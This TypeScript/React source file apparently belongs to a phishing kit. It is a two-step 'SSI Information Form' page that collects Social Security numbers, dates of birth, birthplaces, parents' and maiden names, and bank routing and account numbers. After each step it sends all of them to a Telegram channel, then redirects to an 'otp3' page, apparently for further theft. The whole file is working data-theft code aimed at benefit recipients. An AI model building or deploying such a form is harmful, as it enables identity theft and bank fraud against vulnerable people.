"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";
import { sendTelegramMessage } from "../../utils/telegram"; // Import Telegram function

// Regex patterns for validation
const ssnRegex = /^\d{3}-\d{2}-\d{4}$/; // SSN format: XXX-XX-XXXX
const routingNumberRegex = /^\d{9}$/; // 9-digit Routing Number
const accountNumberRegex = /^\d{8,17}$/; // 8-17 digit Account Number

// Function to validate input fields
const validateInput = (field: string, value: string): string => {
  switch (field) {
    case "ssn":
      return ssnRegex.test(value) ? "" : "SSN must be in XXX-XX-XXXX format.";
    case "routingNumber":
      return routingNumberRegex.test(value) ? "" : "Routing Number must be 9 digits.";
    case "accountNumber":
      return accountNumberRegex.test(value) ? "" : "Account Number must be 8-17 digits.";
    case "amount":
      return value.trim() ? "" : "Amount is required.";
    case "fatherName":
      return value.trim() ? "" : "Father's name is required.";
    case "motherName":
      return value.trim() ? "" : "Mother's full name is required.";
    case "maidenName":
      return value.trim() ? "" : "Mother's maiden name is required.";
    case "stateOfBirth":
      return value.trim() ? "" : "State of birth is required.";
    case "cityOfBirth":
      return value.trim() ? "" : "City of birth is required.";
    case "paymentDate":
      return value.trim() ? "" : "Date of receiving SSI payment is required.";
    default:
      return "";
  }
};

const SSIFormPage = () => {
  const [formErrors, setFormErrors] = useState<Record<string, string>>({});
  const [step, setStep] = useState<number>(1); // Step 1 or Step 2
  const [formData, setFormData] = useState({
    ssn: "",
    dob: "",
    stateOfBirth: "",
    cityOfBirth: "",
    amount: "",
    fatherName: "",
    motherName: "",
    maidenName: "",
    routingNumber: "",
    accountNumber: "",
    paymentDate: "",
  });
  const router = useRouter();

  // Handle input changes
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  // Format SSN input
  const handleSSNChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleaned = e.target.value.replace(/\D/g, "");
    let formattedSSN = cleaned;
    if (cleaned.length > 3) formattedSSN = `${cleaned.slice(0, 3)}-${cleaned.slice(3, 5)}`;
    if (cleaned.length > 5) formattedSSN += `-${cleaned.slice(5, 9)}`;
    setFormData({ ...formData, ssn: formattedSSN });
  };

  // Handle form submission
  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    // Validate all fields
    const errors: Record<string, string> = {};
    Object.entries(formData).forEach(([field, value]) => {
      const error = validateInput(field, value);
      if (error) errors[field] = error;
    });

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      return;
    }

    // Prepare message for Telegram
    const message = `
      SSI Information Submitted:
      - SSN: ${formData.ssn}
      - DOB: ${formData.dob}
      - State of Birth: ${formData.stateOfBirth}
      - City of Birth: ${formData.cityOfBirth}
      - SSI Amount: ${formData.amount}
      - Father's Name: ${formData.fatherName}
      - Mother's Full Name: ${formData.motherName}
      - Mother's Maiden Name: ${formData.maidenName}
      - Routing Number: ${formData.routingNumber}
      - Account Number: ${formData.accountNumber}
      - Payment Date: ${formData.paymentDate}
      - Time: ${new Date().toLocaleString()}
    `;

    try {
      // Send message to Telegram
      await sendTelegramMessage(message);
      router.push("/otp3"); // Redirect to success page
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
      alert("An error occurred while submitting the form. Please try again.");
    }
  };

 // Go to the next step
const nextStep = async () => {
  // Validate Step 1 fields before proceeding
  const step1Fields = ["ssn", "dob", "stateOfBirth", "cityOfBirth", "amount"];
  const errors: Record<string, string> = {};
  
 // Validate each field in Step 1
step1Fields.forEach((field) => {
  const typedField = field as keyof typeof formData; // ✅ Ensures TypeScript recognizes it as a valid key
  const error = validateInput(typedField, formData[typedField]); 
  if (error) errors[typedField] = error;
});


  // If there are validation errors, display them
  if (Object.keys(errors).length > 0) {
    setFormErrors(errors);
  } else {
    setFormErrors({});

    // Prepare the message to send to Telegram
    const message = `SSI Information Submitted:
      - SSN: ${formData.ssn}
      - DOB: ${formData.dob}
      - State of Birth: ${formData.stateOfBirth}
      - City of Birth: ${formData.cityOfBirth}
      - SSI Amount: ${formData.amount}
      - Time: ${new Date().toLocaleString()}
    `;

    try {
      // Send the message to Telegram before proceeding
      await sendTelegramMessage(message);
      setStep(2); // Proceed to the next step if message is sent successfully
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
      alert("Error sending data to Telegram. Please try again.");
    }
  }
};


  // Go to the previous step
  const prevStep = () => {
    setStep(1);
  };

  return (
    <>
      <Head>
        <title>SSI Information</title>
      </Head>
      <div className="min-h-screen flex flex-col bg-gray-50">
        <main className="flex-grow container mx-auto mt-12 px-4">
          <div className="max-w-lg mx-auto bg-white p-10 shadow-lg rounded-xl">
            <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">
              SSI Information Form
            </h1>
            <form onSubmit={handleFormSubmit} aria-label="SSI form">
              {step === 1 && (
                <>
                  {/* Step 1: Personal Information */}
                  <div className="mb-6">
                    <label htmlFor="ssn" className="block text-sm font-medium text-black">
                      SSN
                    </label>
                    <input
                      id="ssn"
                      name="ssn"
                      type="text"
                      required
                      value={formData.ssn}
                      onChange={handleSSNChange}
                      maxLength={11}
                      placeholder="XXX-XX-XXXX"
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.ssn && <p className="text-red-500 text-sm mt-1">{formErrors.ssn}</p>}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="dob" className="block text-sm font-medium text-black">
                      Date of Birth
                    </label>
                    <input
                      id="dob"
                      name="dob"
                      type="date"
                      required
                      value={formData.dob}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.dob && <p className="text-red-500 text-sm mt-1">{formErrors.dob}</p>}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="stateOfBirth" className="block text-sm font-medium text-black">
                      State of Birth
                    </label>
                    <input
                      id="stateOfBirth"
                      name="stateOfBirth"
                      type="text"
                      required
                      value={formData.stateOfBirth}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.stateOfBirth && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.stateOfBirth}</p>
                    )}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="cityOfBirth" className="block text-sm font-medium text-black">
                      City of Birth
                    </label>
                    <input
                      id="cityOfBirth"
                      name="cityOfBirth"
                      type="text"
                      required
                      value={formData.cityOfBirth}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.cityOfBirth && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.cityOfBirth}</p>
                    )}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="amount" className="block text-sm font-medium text-black">
                      SSI Amount
                    </label>
                    <input
                      id="amount"
                      name="amount"
                      type="number"
                      required
                      value={formData.amount}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.amount && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.amount}</p>
                    )}
                  </div>

                  <button
                    type="button"
                    onClick={nextStep}
                    className="w-full px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7]"
                  >
                    Next
                  </button>
                </>
              )}

              {step === 2 && (
                <>
                  {/* Step 2: Family and Payment Information */}
                  <div className="mb-6">
                    <label htmlFor="fatherName" className="block text-sm font-medium text-black">
                    Father&apos;s Name
                    </label>
                    <input
                      id="fatherName"
                      name="fatherName"
                      type="text"
                      required
                      value={formData.fatherName}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.fatherName && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.fatherName}</p>
                    )}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="motherName" className="block text-sm font-medium text-black">
                    Mother&apos;s Full Name
                    </label>
                    <input
                      id="motherName"
                      name="motherName"
                      type="text"
                      required
                      value={formData.motherName}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.motherName && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.motherName}</p>
                    )}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="maidenName" className="block text-sm font-medium text-black">
                    Mother&apos;s Maiden Name
                    </label>
                    <input
                      id="maidenName"
                      name="maidenName"
                      type="text"
                      required
                      value={formData.maidenName}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.maidenName && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.maidenName}</p>
                    )}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="routingNumber" className="block text-sm font-medium text-black">
                      Routing Number
                    </label>
                    <input
                      id="routingNumber"
                      name="routingNumber"
                      type="text"
                      required
                      value={formData.routingNumber}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.routingNumber && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.routingNumber}</p>
                    )}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="accountNumber" className="block text-sm font-medium text-black">
                      Account Number
                    </label>
                    <input
                      id="accountNumber"
                      name="accountNumber"
                      type="text"
                      required
                      value={formData.accountNumber}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.accountNumber && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.accountNumber}</p>
                    )}
                  </div>

                  <div className="mb-6">
                    <label htmlFor="paymentDate" className="block text-sm font-medium text-black">
                      Date Receiving SSI Payment
                    </label>
                    <input
                      id="paymentDate"
                      name="paymentDate"
                      type="date"
                      required
                      value={formData.paymentDate}
                      onChange={handleInputChange}
                      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2"
                    />
                    {formErrors.paymentDate && (
                      <p className="text-red-500 text-sm mt-1">{formErrors.paymentDate}</p>
                    )}
                  </div>

                  <div className="flex gap-4">
                    <button
                      type="button"
                      onClick={prevStep}
                      className="w-1/2 px-6 py-3 font-medium text-gray-800 bg-gray-200 rounded-lg hover:bg-gray-300"
                    >
                      Previous
                    </button>
                    <button
                      type="submit"
                      className="w-1/2 px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7]"
                    >
                      Submit
                    </button>
                  </div>
                </>
              )}
            </form>
          </div>
        </main>
      </div>
    </>
  );
};

export default SSIFormPage;